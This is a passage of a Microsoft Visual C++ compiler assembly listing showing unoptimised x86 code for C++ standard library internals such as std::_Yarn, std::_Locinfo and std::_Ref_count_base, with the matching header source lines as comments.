  00012	8b 11		 mov	 edx, DWORD PTR [ecx]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 _free
  0001a	83 c4 04	 add	 esp, 4
$LN2@Tidy:

; 209  : #endif
; 210  :         }
; 211  : 
; 212  :         _Myptr = nullptr;

  0001d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00020	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], 0

; 213  :     }

  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
?_Tidy@?$_Yarn@_W@std@@AAEXXZ ENDP			; std::_Yarn<wchar_t>::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ??1?$_Yarn@_W@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$_Yarn@_W@std@@QAE@XZ PROC				; std::_Yarn<wchar_t>::~_Yarn<wchar_t>, COMDAT
; _this$ = ecx

; 182  :     __CLR_OR_THIS_CALL ~_Yarn() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 183  :         _Tidy();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Tidy@?$_Yarn@_W@std@@AAEXXZ ; std::_Yarn<wchar_t>::_Tidy

; 184  :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1?$_Yarn@_W@std@@QAE@XZ ENDP				; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ??0?$_Yarn@_W@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0?$_Yarn@_W@std@@QAE@XZ PROC				; std::_Yarn<wchar_t>::_Yarn<wchar_t>, COMDAT
; _this$ = ecx

; 141  :     __CLR_OR_THIS_CALL _Yarn() noexcept : _Myptr(nullptr), _Nul(0) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], 0
  00010	33 c9		 xor	 ecx, ecx
  00012	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00015	66 89 4a 04	 mov	 WORD PTR [edx+4], cx
  00019	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001c	8b e5		 mov	 esp, ebp
  0001e	5d		 pop	 ebp
  0001f	c3		 ret	 0
??0?$_Yarn@_W@std@@QAE@XZ ENDP				; std::_Yarn<wchar_t>::_Yarn<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ?_Tidy@?$_Yarn@D@std@@AAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Tidy@?$_Yarn@D@std@@AAEXXZ PROC			; std::_Yarn<char>::_Tidy, COMDAT
; _this$ = ecx

; 203  :     void __CLR_OR_THIS_CALL _Tidy() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 204  :         if (_Myptr) {

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 38 00	 cmp	 DWORD PTR [eax], 0
  0000d	74 0e		 je	 SHORT $LN2@Tidy

; 205  : #ifdef _DEBUG
; 206  :             _free_dbg(_Myptr, _CRT_BLOCK);
; 207  : #else
; 208  :             _CSTD free(_Myptr);

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	8b 11		 mov	 edx, DWORD PTR [ecx]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 _free
  0001a	83 c4 04	 add	 esp, 4
$LN2@Tidy:

; 209  : #endif
; 210  :         }
; 211  : 
; 212  :         _Myptr = nullptr;

  0001d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00020	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], 0

; 213  :     }

  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
?_Tidy@?$_Yarn@D@std@@AAEXXZ ENDP			; std::_Yarn<char>::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ?c_str@?$_Yarn@D@std@@QBEPBDXZ
_TEXT	SEGMENT
tv68 = -8						; size = 4
_this$ = -4						; size = 4
?c_str@?$_Yarn@D@std@@QBEPBDXZ PROC			; std::_Yarn<char>::c_str, COMDAT
; _this$ = ecx

; 190  :     _Ret_z_ const _Elem* __CLR_OR_THIS_CALL c_str() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 191  :         return _Myptr ? _Myptr : &_Nul;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 38 00	 cmp	 DWORD PTR [eax], 0
  0000f	74 0a		 je	 SHORT $LN3@c_str
  00011	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00014	8b 11		 mov	 edx, DWORD PTR [ecx]
  00016	89 55 f8	 mov	 DWORD PTR tv68[ebp], edx
  00019	eb 09		 jmp	 SHORT $LN4@c_str
$LN3@c_str:
  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	83 c0 04	 add	 eax, 4
  00021	89 45 f8	 mov	 DWORD PTR tv68[ebp], eax
$LN4@c_str:
  00024	8b 45 f8	 mov	 eax, DWORD PTR tv68[ebp]

; 192  :     }

  00027	8b e5		 mov	 esp, ebp
  00029	5d		 pop	 ebp
  0002a	c3		 ret	 0
?c_str@?$_Yarn@D@std@@QBEPBDXZ ENDP			; std::_Yarn<char>::c_str
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ??1?$_Yarn@D@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$_Yarn@D@std@@QAE@XZ PROC				; std::_Yarn<char>::~_Yarn<char>, COMDAT
; _this$ = ecx

; 182  :     __CLR_OR_THIS_CALL ~_Yarn() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 183  :         _Tidy();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Tidy@?$_Yarn@D@std@@AAEXXZ ; std::_Yarn<char>::_Tidy

; 184  :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1?$_Yarn@D@std@@QAE@XZ ENDP				; std::_Yarn<char>::~_Yarn<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ??0?$_Yarn@D@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0?$_Yarn@D@std@@QAE@XZ PROC				; std::_Yarn<char>::_Yarn<char>, COMDAT
; _this$ = ecx

; 141  :     __CLR_OR_THIS_CALL _Yarn() noexcept : _Myptr(nullptr), _Nul(0) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], 0
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	c6 41 04 00	 mov	 BYTE PTR [ecx+4], 0
  00017	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
??0?$_Yarn@D@std@@QAE@XZ ENDP				; std::_Yarn<char>::_Yarn<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ?_Getctype@_Locinfo@std@@QBE?AU_Ctypevec@@XZ
_TEXT	SEGMENT
$T1 = -20						; size = 16
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
?_Getctype@_Locinfo@std@@QBE?AU_Ctypevec@@XZ PROC	; std::_Locinfo::_Getctype, COMDAT
; _this$ = ecx

; 277  :     _Ctypevec __CLR_OR_THIS_CALL _Getctype() const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 278  :         return ::_Getctype();

  00009	8d 45 ec	 lea	 eax, DWORD PTR $T1[ebp]
  0000c	50		 push	 eax
  0000d	e8 00 00 00 00	 call	 __Getctype
  00012	83 c4 04	 add	 esp, 4
  00015	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00018	8b 10		 mov	 edx, DWORD PTR [eax]
  0001a	89 11		 mov	 DWORD PTR [ecx], edx
  0001c	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  0001f	89 51 04	 mov	 DWORD PTR [ecx+4], edx
  00022	8b 50 08	 mov	 edx, DWORD PTR [eax+8]
  00025	89 51 08	 mov	 DWORD PTR [ecx+8], edx
  00028	8b 40 0c	 mov	 eax, DWORD PTR [eax+12]
  0002b	89 41 0c	 mov	 DWORD PTR [ecx+12], eax
  0002e	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 279  :     }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c2 04 00	 ret	 4
?_Getctype@_Locinfo@std@@QBE?AU_Ctypevec@@XZ ENDP	; std::_Locinfo::_Getctype
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ??1_Locinfo@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Locinfo@std@@QAE@XZ PROC				; std::_Locinfo::~_Locinfo, COMDAT
; _this$ = ecx

; 257  :     __CLR_OR_THIS_CALL ~_Locinfo() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 258  :         _Locinfo_dtor(this);

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ?_Locinfo_dtor@_Locinfo@std@@SAXPAV12@@Z ; std::_Locinfo::_Locinfo_dtor
  00010	83 c4 04	 add	 esp, 4

; 259  :     }

  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	83 c1 2c	 add	 ecx, 44			; 0000002cH
  00019	e8 00 00 00 00	 call	 ??1?$_Yarn@D@std@@QAE@XZ ; std::_Yarn<char>::~_Yarn<char>
  0001e	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00021	83 c1 24	 add	 ecx, 36			; 00000024H
  00024	e8 00 00 00 00	 call	 ??1?$_Yarn@D@std@@QAE@XZ ; std::_Yarn<char>::~_Yarn<char>
  00029	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002c	83 c1 1c	 add	 ecx, 28			; 0000001cH
  0002f	e8 00 00 00 00	 call	 ??1?$_Yarn@_W@std@@QAE@XZ ; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
  00034	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00037	83 c1 14	 add	 ecx, 20			; 00000014H
  0003a	e8 00 00 00 00	 call	 ??1?$_Yarn@_W@std@@QAE@XZ ; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
  0003f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00042	83 c1 0c	 add	 ecx, 12			; 0000000cH
  00045	e8 00 00 00 00	 call	 ??1?$_Yarn@D@std@@QAE@XZ ; std::_Yarn<char>::~_Yarn<char>
  0004a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0004d	83 c1 04	 add	 ecx, 4
  00050	e8 00 00 00 00	 call	 ??1?$_Yarn@D@std@@QAE@XZ ; std::_Yarn<char>::~_Yarn<char>
  00055	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00058	e8 00 00 00 00	 call	 ??1_Lockit@std@@QAE@XZ	; std::_Lockit::~_Lockit
  0005d	8b e5		 mov	 esp, ebp
  0005f	5d		 pop	 ebp
  00060	c3		 ret	 0
??1_Locinfo@std@@QAE@XZ ENDP				; std::_Locinfo::~_Locinfo
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocinfo
;	COMDAT ??0_Locinfo@std@@QAE@PBD@Z
_TEXT	SEGMENT
tv69 = -8						; size = 4
_this$ = -4						; size = 4
__Pch$ = 8						; size = 4
??0_Locinfo@std@@QAE@PBD@Z PROC				; std::_Locinfo::_Locinfo, COMDAT
; _this$ = ecx

; 235  :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 233  :         : _Lock(_LOCK_LOCALE)

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv69[ebp], eax
  0000f	6a 00		 push	 0
  00011	8b 4d f8	 mov	 ecx, DWORD PTR tv69[ebp]
  00014	e8 00 00 00 00	 call	 ??0_Lockit@std@@QAE@H@Z	; std::_Lockit::_Lockit

; 235  :     {

  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	83 c1 04	 add	 ecx, 4
  0001f	e8 00 00 00 00	 call	 ??0?$_Yarn@D@std@@QAE@XZ ; std::_Yarn<char>::_Yarn<char>
  00024	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00027	83 c1 0c	 add	 ecx, 12			; 0000000cH
  0002a	e8 00 00 00 00	 call	 ??0?$_Yarn@D@std@@QAE@XZ ; std::_Yarn<char>::_Yarn<char>
  0002f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00032	83 c1 14	 add	 ecx, 20			; 00000014H
  00035	e8 00 00 00 00	 call	 ??0?$_Yarn@_W@std@@QAE@XZ ; std::_Yarn<wchar_t>::_Yarn<wchar_t>
  0003a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0003d	83 c1 1c	 add	 ecx, 28			; 0000001cH
  00040	e8 00 00 00 00	 call	 ??0?$_Yarn@_W@std@@QAE@XZ ; std::_Yarn<wchar_t>::_Yarn<wchar_t>
  00045	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00048	83 c1 24	 add	 ecx, 36			; 00000024H
  0004b	e8 00 00 00 00	 call	 ??0?$_Yarn@D@std@@QAE@XZ ; std::_Yarn<char>::_Yarn<char>
  00050	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00053	83 c1 2c	 add	 ecx, 44			; 0000002cH
  00056	e8 00 00 00 00	 call	 ??0?$_Yarn@D@std@@QAE@XZ ; std::_Yarn<char>::_Yarn<char>

; 236  :         if (_Pch) {

  0005b	83 7d 08 00	 cmp	 DWORD PTR __Pch$[ebp], 0
  0005f	74 12		 je	 SHORT $LN2@Locinfo

; 237  :             _Locinfo_ctor(this, _Pch);

  00061	8b 4d 08	 mov	 ecx, DWORD PTR __Pch$[ebp]
  00064	51		 push	 ecx
  00065	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00068	52		 push	 edx
  00069	e8 00 00 00 00	 call	 ?_Locinfo_ctor@_Locinfo@std@@SAXPAV12@PBD@Z ; std::_Locinfo::_Locinfo_ctor
  0006e	83 c4 08	 add	 esp, 8

; 238  :             return;

  00071	eb 0a		 jmp	 SHORT $LN1@Locinfo
$LN2@Locinfo:

; 239  :         }
; 240  : 
; 241  :         _Xruntime_error("bad locale name");

  00073	68 00 00 00 00	 push	 OFFSET ??_C@_0BA@ELKIONDK@bad?5locale?5name@
  00078	e8 00 00 00 00	 call	 ?_Xruntime_error@std@@YAXPBD@Z ; std::_Xruntime_error
$LN1@Locinfo:

; 242  :     }

  0007d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
$LN3@Locinfo:
  00080	8b e5		 mov	 esp, ebp
  00082	5d		 pop	 ebp
  00083	c2 04 00	 ret	 4
??0_Locinfo@std@@QAE@PBD@Z ENDP				; std::_Locinfo::_Locinfo
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G_Facet_base@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_G_Facet_base@std@@UAEPAXI@Z PROC			; std::_Facet_base::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1_Facet_base@std@@UAE@XZ ; std::_Facet_base::~_Facet_base
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 04		 push	 4
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_G_Facet_base@std@@UAEPAXI@Z ENDP			; std::_Facet_base::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0_Facet_base@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0_Facet_base@std@@QAE@XZ PROC				; std::_Facet_base::_Facet_base, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7_Facet_base@std@@6B@
  00010	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00013	8b e5		 mov	 esp, ebp
  00015	5d		 pop	 ebp
  00016	c3		 ret	 0
??0_Facet_base@std@@QAE@XZ ENDP				; std::_Facet_base::_Facet_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xfacet
;	COMDAT ??1_Facet_base@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Facet_base@std@@UAE@XZ PROC				; std::_Facet_base::~_Facet_base, COMDAT
; _this$ = ecx

; 25   :     virtual __CLR_OR_THIS_CALL ~_Facet_base() noexcept {} // ensure that derived classes can be destroyed properly

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7_Facet_base@std@@6B@
  00010	8b e5		 mov	 esp, ebp
  00012	5d		 pop	 ebp
  00013	c3		 ret	 0
??1_Facet_base@std@@UAE@XZ ENDP				; std::_Facet_base::~_Facet_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?_Get_deleter@_Ref_count_base@std@@UBEPAXABVtype_info@@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 4
?_Get_deleter@_Ref_count_base@std@@UBEPAXABVtype_info@@@Z PROC ; std::_Ref_count_base::_Get_deleter, COMDAT
; _this$ = ecx

; 1164 :     virtual void* _Get_deleter(const type_info&) const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1165 :         return nullptr;

  00007	33 c0		 xor	 eax, eax

; 1166 :     }

  00009	8b e5		 mov	 esp, ebp
  0000b	5d		 pop	 ebp
  0000c	c2 04 00	 ret	 4
?_Get_deleter@_Ref_count_base@std@@UBEPAXABVtype_info@@@Z ENDP ; std::_Ref_count_base::_Get_deleter
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?_Decwref@_Ref_count_base@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Decwref@_Ref_count_base@std@@QAEXXZ PROC		; std::_Ref_count_base::_Decwref, COMDAT
; _this$ = ecx

; 1154 :     void _Decwref() noexcept { // decrement weak reference count

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1155 :         if (_MT_DECR(_Weaks) == 0) {

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 c0 08	 add	 eax, 8
  0000d	83 c9 ff	 or	 ecx, -1
  00010	f0 0f c1 08	 lock	  xadd	 DWORD PTR [eax], ecx
  00014	49		 dec	 ecx
  00015	75 0d		 jne	 SHORT $LN2@Decwref

; 1156 :             _Delete_this();

  00017	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0001a	8b 02		 mov	 eax, DWORD PTR [edx]
  0001c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  00022	ff d2		 call	 edx
$LN2@Decwref:

; 1157 :         }
; 1158 :     }

  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c3		 ret	 0
?_Decwref@_Ref_count_base@std@@QAEXXZ ENDP		; std::_Ref_count_base::_Decwref
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?_Decref@_Ref_count_base@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Decref@_Ref_count_base@std@@QAEXXZ PROC		; std::_Ref_count_base::_Decref, COMDAT
; _this$ = ecx

; 1147 :     void _Decref() noexcept { // decrement use count

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1148 :         if (_MT_DECR(_Uses) == 0) {

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 c0 04	 add	 eax, 4
  0000d	83 c9 ff	 or	 ecx, -1
  00010	f0 0f c1 08	 lock	  xadd	 DWORD PTR [eax], ecx
  00014	49		 dec	 ecx
  00015	75 14		 jne	 SHORT $LN2@Decref

; 1149 :             _Destroy();

  00017	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0001a	8b 02		 mov	 eax, DWORD PTR [edx]
  0001c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	8b 10		 mov	 edx, DWORD PTR [eax]
  00021	ff d2		 call	 edx

; 1150 :             _Decwref();

  00023	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00026	e8 00 00 00 00	 call	 ?_Decwref@_Ref_count_base@std@@QAEXXZ ; std::_Ref_count_base::_Decwref
$LN2@Decref:

; 1151 :         }
; 1152 :     }

  0002b	8b e5		 mov	 esp, ebp
  0002d	5d		 pop	 ebp
  0002e	c3		 ret	 0
?_Decref@_Ref_count_base@std@@QAEXXZ ENDP		; std::_Ref_count_base::_Decref
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?_Incref@_Ref_count_base@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Incref@_Ref_count_base@std@@QAEXXZ PROC		; std::_Ref_count_base::_Incref, COMDAT
; _this$ = ecx

; 1139 :     void _Incref() noexcept { // increment use count

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1140 :         _MT_INCR(_Uses);

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 c0 04	 add	 eax, 4
  0000d	f0 ff 00	 lock	  inc	 DWORD PTR [eax]

; 1141 :     }

  00010	8b e5		 mov	 esp, ebp
  00012	5d		 pop	 ebp
  00013	c3		 ret	 0
?_Incref@_Ref_count_base@std@@QAEXXZ ENDP		; std::_Ref_count_base::_Incref
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??1_Ref_count_base@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Ref_count_base@std@@UAE@XZ PROC			; std::_Ref_count_base::~_Ref_count_base, COMDAT
; _this$ = ecx

; 1118 :     virtual ~_Ref_count_base() noexcept {} // TRANSITION, should be non-virtual

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
??1_Ref_count_base@std@@UAE@XZ ENDP			; std::_Ref_count_base::~_Ref_count_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??0_Ref_count_base@std@@IAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0_Ref_count_base@std@@IAE@XZ PROC			; std::_Ref_count_base::_Ref_count_base, COMDAT
; _this$ = ecx

; 1112 :     constexpr _Ref_count_base() noexcept = default; // non-atomic initializations

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1108 :     _Atomic_counter_t _Uses  = 1;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 40 04 01 00
	00 00		 mov	 DWORD PTR [eax+4], 1

; 1109 :     _Atomic_counter_t _Weaks = 1;

  00011	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00014	c7 41 08 01 00
	00 00		 mov	 DWORD PTR [ecx+8], 1

; 1112 :     constexpr _Ref_count_base() noexcept = default; // non-atomic initializations

  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c3		 ret	 0
??0_Ref_count_base@std@@IAE@XZ ENDP			; std::_Ref_count_base::_Ref_count_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\typeinfo
;	COMDAT ?_Throw_bad_cast@std@@YAXXZ
_TEXT	SEGMENT
$T1 = -12						; size = 12
?_Throw_bad_cast@std@@YAXXZ PROC			; std::_Throw_bad_cast, COMDAT

; 66   : [[noreturn]] inline void _Throw_bad_cast() {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH

; 67   :     _THROW(bad_cast{});

  00006	8d 4d f4	 lea	 ecx, DWORD PTR $T1[ebp]
  00009	e8 00 00 00 00	 call	 ??0bad_cast@std@@QAE@XZ	; std::bad_cast::bad_cast
  0000e	68 00 00 00 00	 push	 OFFSET __TI2?AVbad_cast@std@@
  00013	8d 45 f4	 lea	 eax, DWORD PTR $T1[ebp]
  00016	50		 push	 eax
